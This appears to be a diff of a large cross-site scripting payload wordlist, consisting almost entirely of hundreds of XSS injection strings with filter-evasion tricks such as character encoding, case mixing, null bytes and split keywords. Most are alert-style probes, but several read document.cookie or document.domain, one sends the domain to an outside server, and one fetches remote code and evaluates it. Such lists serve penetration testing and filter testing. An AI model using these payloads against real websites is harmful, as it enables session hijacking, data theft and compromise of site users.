 <ScriPt>ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()</sCripT>
 <ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
 '`"//><script>alert(1)</script>
@@ -1545,16 +2501,13 @@ OnXSS=<Img/Src/OnError=alert(1)>
 <script>alert()</script>”/></style>
 <script ^__^>alert(String.fromCharCode(49))</script ^__^
 "><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
-"><script>alert(String.fromCharCode(88,83,83))</script>
 <<SCRIPT>alert("test");//<</SCRIPT>
 <script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>	
-"><script>alert('XSS')</script>
 //*><ScRipt>alert(/XSS/)</ScriPT>
 <<SCRIPT>alert(�XSS�);//<</SCRIPT>
 ?"></script><base%20c%3D=href%3Dhttps:\targetsite>
 <script charset="\x22>javascript:alert(1)</script>
 <!<script>confirm(1)</script>
-<script ~~~>confirm(1)</script ~~~>
 <!--><script>confirm/**/()/**/</script>
 <script //>//confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')//</script //
 <script>eval('\x61lert(\'33\')')</script>
@@ -1573,7 +2526,6 @@ image src\r\n=valid.jpg onloadend='new class extends (co\u006efir\u006d)/**/`` &
 img{background-image:url('javascript:alert()')}
 <img border=3 alt=jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e>
 <IMG DYNSRC="javascript:javascript:alert(1)">
-<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
 <img ignored=() src=x onerror=prompt(1)>
 <IMG LOWSRC="javascript:javascript:alert(1)">
 “><img onerror=alert(1) src>
@@ -1582,7 +2534,6 @@ img{background-image:url('javascript:alert()')}
 <img/src=`%00`%20onerror=this.onerror=confirm(1)
 <img src=`%00`&NewLine; onerror=alert(1)&NewLine;
 <img/src=`%00` onerror=this.onerror=confirm(1)
-<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
 <img src=1 href=1 onerror="javascript:alert('HEJAP ZAIRY AL-SHARIF')"></img>
 <img src=1 onerror="a:b:c:d:alert(1)">
 <img+src=1+onerror=alert(1)>&anything_else=test
@@ -1624,7 +2575,6 @@ img{background-image:url('javascript:alert()')}
 <img/src/onerror=alert(`coffinxp`)>
 <img src="" onerror="alert(document.cookie)">
 ??"><img/src/onerror=alert(document.domain)>
-<img/src/onerror=alert//&NewLine;(2)>
 <img/src/onerror=alert&sol;**&sol;(3)>
 <img/src/onerror=alert&#xFEFF;(1337)>
 <--`<img/src=` onerror=confirm``> --!>
@@ -1654,7 +2604,6 @@ img{background-image:url('javascript:alert()')}
 <input type=image src=1 onerror=alert(1)>	
 <input type="image" src="invalid" onerror="alert('XSS')">
 <INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">
-<input type=image src onerror="prompt(1)">
 <input type=search onsearch="location='data:text/html;\x62\x61\x73\x65\x36\x34,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='">
 "><input type="submit" formaction="javascript&colon;this&lsqb;'a'&plus;'lert'&rsqb;`1`"
 <input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
@@ -1768,9 +2717,7 @@ javascript:"/*\"/*'/*--></title></textarea></style></noscript></template></noemb
 "><img+src=x+onerror=alert(1)>
 <img src='x' onerror='alert(1)'>
 "><img src="x" onerror=alert(1337) />
-"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
 <img src=x onerror=alert(String.fromCharCode(88,83,83));>
-"><img src=x onerror=alert('XSS');>
 <img src=x onerror=alert('XSS')//
 <img src=x onerror=alert('XSS');>
 <img/src="x"/onerror="[boom]">
@@ -1781,7 +2728,6 @@ javascript:"/*\"/*'/*--></title></textarea></style></noscript></template></noemb
 <img src=x onerror="js:abc='al'+'ert()';eval(abc)" />
 <img/src="x"/onerror="prom\u0070t&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;">
 <img src=x onerror="\u0061lert(1)"/>
-"><img src=x onerror=window.open('https://www.google.com/');>
 ><img src=x onmouseleave=print()>
 ?><img src=x onmouseleave=print()>
 <img+src=x+on<!--ram-->error=ale<!--ram-->rt(1)>
@@ -1831,7 +2777,6 @@ javascript:"/*\"/*'/*--></title></textarea></style></noscript></template></noemb
 %3Csvg%20onload=alert(1)%3E
 %3Csvg%2Fonload%3Dalert%28%22XSS%22%29%20%3E, <svg/onload=alert("XSS") >
 %3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F
-%3csvg/onload=window%5b"al"+"ert"%5d`1337`%3e
 %3Cx/Onpointerrawupdate=confirm%26lpar;)%3Exxxxx
 %3F%20<img/src/onerror=alert(coffinxp`)>
 444-555-4455 <img src=x onerror=alert(1)>
@@ -1997,7 +2942,6 @@ alert`1`
 alert`23`
 {alert('document.cookie')}
 ';alert(document.domain)//
-alert(document.domain)
 ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
 alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
@@ -2047,7 +2991,6 @@ ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%25
 <b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
 banner.swf?clickTAG=javascript:alert(1);//
 <base href="alert(1)" onfocus="a = /\/([^/]+)$/.exec(baseURI); eval(a[1]);" tabindex=1 style="display:block" autofocus></base>
-<base href="javascript:alert('XSS');">
 <BASE HREF="javascript:javascript:alert(1);//">
 <bgsound src="javascript:alert('XSS');">
 <BGSOUND SRC="javascript:javascript:alert(1);">
@@ -2167,7 +3110,6 @@ data:text/html,<script>alert(0)</script>
 "><details/open/ontoggle=prompt("/test/")>
 <details open ontoggle='self["ale"%2b"rt"]&lpar;document&period;domain&rpar;'>
 <details/open/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];">
-<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
 dfsse%3cimg%20src%3da%20onerror%3dalert(1)%3ez1668cyj2pi
 "><div class=progress><div onwebkitanimationstart=prompt(document.domain)>
 <div data-url="javascript:alert('XSS')"></div>
@@ -2380,7 +3322,6 @@ Login.aspx?username=<img/src/onerror=alert(coffinxp)>
 &ltscr\x00ipt&gtalert('Steiner254')&lt/scr\x00ipt&gt
 ">><marquee><img src=x onerror=confirm(1)></marquee>"
 '">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
-">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
 <marquee loop=1 onfinish=alert( )>x
 <marquee loop=1 width=0 onfinish=alert`1`>XSS</marquee>
 <marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
@@ -2519,9 +3460,6 @@ Reflect.set.call`${location}${'href'}${name}`
 <Rxss onscrollend=alert(origin) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br>++</Rxss>
 <s%08c%08r%08i%08p%08t>al%08ert%08()<%08/%08s%08c%08r%08i%08p%08t%08>
 <sc%00ript/test='asdf'>alert/**/(1)</script>
-<script>$=1,alert($)</script>
-<script>$=1,\u0061lert($)</script>
-<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
 <script/%00%00v%00%00>document.location.href=location.hash.slice(1)</script>#javascript:alert(document.cookie)
 <script>%0d%0aalert(1)</script>
 <script>+-+-1-+-+alert(1)</script>
@@ -2546,8 +3484,6 @@ Reflect.set.call`${location}${'href'}${name}`
 "}]}';</script><script>alert('You got XSSed')</script>
 #</script><script>alert('You got XSSed')</script>
 </script><script>alert('You got XSSed')</script>
-<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
-<</script/script><script ~~~>\u0061lert(1)</script ~~~>
 “=””’></><script></script><svg onload=alert(1)>
 “ =”” ‘></><script></script><svg onload”=”alertonload=alert(1)””
 <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
@@ -2631,7 +3567,6 @@ s = '"><script>alert(1)</script>' print 'eval(String.fromCharCode('+",".join([st
 <style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
 <style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;	
 <style onreadystatechange=javascript:javascript:alert(1);></style>
-</style></scRipt><scRipt>alert(1)</scRipt>
 <///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
 <STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE>
 <STYLE TYPE="text/javascript">javascript:alert(1);</STYLE>
@@ -2649,8 +3584,6 @@ s = '"><script>alert(1)</script>' print 'eval(String.fromCharCode('+",".join([st
 <svg contentScriptType=text/vbs><script>MsgBox+1
 <svg> <foreignObject width="100%" height="100%"> <body> <iframe src='javascript:confirm(10)'></iframe> </body> </foreignObject> </svg>
 <svg id=alert(1) onload=eval(id)>
-<svg id=`x`onload=alert(1)>
-<svg id=x;onload=alert(1)>
 <svg>on%20onload%3D(“XSS”)(document.domain)<%2Fsvg>
 <svg onauxclick='a=alert;b=document;a(b.domain)'>
 "/><svg onauxclick=&#x63&#x6F&#x5C&#x75&#x30&#x30&#x36&#x65&#x66&#x69&#x72&#x6D(\\1\\)>
@@ -2669,7 +3602,6 @@ s = '"><script>alert(1)</script>' print 'eval(String.fromCharCode('+",".join([st
 #<!--><svg onload=alert(1)-->
 <!--><svg onload=alert(1)-->
 <svgonload=alert(1)>
-<svg////////onload=alert(1)>
 <svg/onload=alert(1)>
 <svg•onload=alert(1)>
 <svg/onload=alert(1)>"@gmail.com
@@ -2682,17 +3614,14 @@ s = '"><script>alert(1)</script>' print 'eval(String.fromCharCode('+",".join([st
 "><svg onload=alert&amp;#x27;#x00000040"1")>
 "><svg onload=alert&amp;#x2F;#x00000040"1")>
 "><svg onload=alert&quot;#x00000040"1")>
-"><svg/onload=alert(String.fromCharCode(88,83,83))>
 <svg/onload=alert(String.fromCharCode(88,83,83))>
 "><svg onload=alert&#x00000040"1")>
 "><svg onload=alert&#x2F;#x00000040"1")>
-"><svg/onload=alert(/XSS/)
 "<!--><Svg OnLoad=confirm?.(/coffin😈/)<!--1")"<!--><Svg+OnLoad=confirm?.(/coffin😈/)<!--
 <svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>
 <svg/onload=eval(atob(‘YWxlcnQoZG9jdW1lbnQuY29va2llKQ==’))>
 <svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
 <svg/onload=location/**/='https://your.server/'+document.domain>
-<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
 <svg onload='new Function`["_Y000!_"].find(al\u0065rt)`'>
 "/><svg/onload=prompt(1)>
 <svg onload=prompt%26%230000000040document.domain)>
@@ -3025,7 +3954,6 @@ www.meteoprog.ua
 <script\x09type="text/javascript">javascript:alert(1);</script>
 <script\x0Ctype="text/javascript">javascript:alert(1);</script>
 <script\x2Ftype="text/javascript">javascript:alert(1);</script>
-<script\x0Atype="text/javascript">javascript:alert(1);</script>
 '`"><\x3Cscript>javascript:alert(1)</script>        
 '`"><\x00script>javascript:alert(1)</script>
 <img src=1 href=1 onerror="javascript:alert(1)"></img>
